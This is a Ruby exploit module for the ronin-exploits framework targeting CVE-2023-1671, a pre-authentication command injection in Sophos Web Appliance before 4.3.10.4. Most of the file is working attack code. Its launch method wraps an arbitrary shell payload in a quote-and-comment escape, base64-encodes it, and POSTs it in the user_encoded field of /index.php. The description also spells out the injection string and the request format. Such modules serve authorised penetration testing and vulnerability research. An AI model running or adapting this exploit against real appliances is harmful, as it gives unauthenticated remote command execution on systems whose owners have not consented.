#!/usr/bin/env -S ronin-exploits run -f

require 'ronin/exploits/command_injection'
require 'ronin/exploits/mixins/http'
require 'ronin/support/encoding/base64'

module Ronin
  module Exploits
    class CVE_2023_1671 < CommandInjection

      include Mixins::HTTP

      register 'sophos/CVE-2023-1671'

      quality :untested
      release_date    '2023-04-24'
      disclosure_date '2023-04-04'
      advisory 'CVE-2023-1671'

      author "Postmodern", email: "postmodern.mod3@gmail.com"
      summary "Pre-auth command injection in Sophos Web Appliance < 4.3.10.4"
      description <<~DESC
        Sophos Web Appliance versions prior to 4.3.10.4 are vulnerable to a
        pre-authentication command injection via the base64 encoded
        `userencoded` query parameter used by the `/index.php` HTTP end-point.

          POST /index.php?c=blocked&action=continue
          Content-Type: application/x-www-form-urlencoded

          args_reason=filetypewarn&url=...&filetype=...&user=...&userencoded=...

        Where `userencoded` contains the base64 encoded string `';COMMAND#`.

      DESC
      references [
        "https://www.sophos.com/en-us/security-advisories/sophos-sa-20230404-swa-rce",
        "https://github.com/ohnonoyesyes/CVE-2023-1671",
        "https://github.com/W01fh4cker/CVE-2023-1671-POC",
        "https://github.com/W01fh4cker/CVE-2023-1671-POC/blob/main/CVE-2023-1671-POC.py",
        "https://github.com/csffs/cve-2023-1671",
        "https://github.com/csffs/cve-2023-1671/blob/main/cve-2023-1671.py"
      ]

      #
      # Sends the HTTP POST request for
      # `/index.php?c=blocked&action=continue` with form params of
      # `args_reason=filetypewarn&url=16625&filetype=5831&user=4525&user_encoded=...`
      # to the target host.
      #
      def launch
        escaped_command = "';#{payload}#"
        encoded_command = escaped_command.base64_encode(mode: :url_safe)

        response = http_post(
          '/index.php', query_params: {c: 'blocked', action: 'continue'},
                        form_data: {
                          args_reason:  'filetypewarn',
                          url:          16625,
                          filetype:     5831,
                          user:         4525,
                          user_encoded: encoded_command
                        }
        )

        unless response.code == '200'
          fail("POST #{base_url}/index.php returned HTTP #{response.code}")
        end
      end

    end
  end
end
